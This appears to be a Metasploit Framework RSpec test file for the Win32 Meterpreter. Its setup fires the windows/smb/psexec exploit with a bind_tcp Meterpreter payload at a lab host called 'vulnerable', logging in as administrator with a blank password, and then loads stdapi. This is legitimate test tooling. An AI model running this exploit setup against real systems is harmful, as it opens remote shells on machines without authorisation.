$:.unshift(File.join(File.dirname(__FILE__)))
$:.unshift(File.join(File.dirname(__FILE__), '..', '..', 'lib'))
$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'lib'))
$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'test', 'lib'))

require 'fileutils'
require 'msf/base'
require 'meterpreter_spec_helper'
require 'msf_matchers'
require 'meterpreter_specs'
require 'windows_meterpreter_specs'

module MsfTest

describe "Win32Meterpreter" do

  # Include Custom Matchers
  include MsfTest::MsfMatchers

  
  # This include brings in all the spec helper methods
  include MsfTest::MeterpreterSpecHelper
  
  # This include brings in all the specs that are generic across the 
  # meterpreter platforms
  include MsfTest::MeterpreterSpecs

  # This include brings in all the specs that are specific to the 
  # windows meterpreter platforms
  include MsfTest::WindowsMeterpreterSpecs

  before :all do
    @verbose = true
  
    @meterpreter_type = "win32"
    
    ## Set up an outupt directory
    @output_directory = File.join(File.dirname(__FILE__), "test_output_#{@meterpreter_type}")

    if File.directory? @output_directory
      FileUtils.rm_rf(@output_directory)
    end

    Dir.mkdir(@output_directory)
    @default_file = "#{@output_directory}/default"

    create_session_windows_x32
  end

  before :each do

  end

  after :each do
    @session.init_ui(@input, @output)
  end		

  after :all do
    
    ## Clean up test output
    FileUtils.rm_rf(@output_directory)

    ## Screenshot command leaves .jpegs :(
    ## TODO - fix the meterpreter command to write to
    ## TODO - an arbitrary file.
    Dir.new(File.dirname(__FILE__)).each do |file|
      if file =~ /.jpeg/
        File.delete(file)
      end
    end
  
  end
  
  def create_session_windows_x32

    ## Setup for win32
    @framework    = Msf::Simple::Framework.create
    @exploit_name = 'windows/smb/psexec'
    @payload_name = 'windows/meterpreter/bind_tcp'
    @input        = Rex::Ui::Text::Input::Stdio.new 
    @output       = Rex::Ui::Text::Output::File.new(@default_file)

    # Initialize the exploit instance
    exploit = @framework.exploits.create(@exploit_name)

    ## Fire it off against a known-vulnerable host
    @session = exploit.exploit_simple(
      'Options'     => {'RHOST' => "vulnerable", "SMBUser" => "administrator", "SMBPass" => ""},
      'Payload'     => @payload_name,
      'LocalInput'  => @input,
      'LocalOutput' => @output)

    ## If a session came back, try to interact with it.
    if @session
      puts "got a session"
      @session.load_stdapi
    else
      puts "unable to get session"		
      #flunk "Couldn't get a session!"
    end
  end
  
end
end
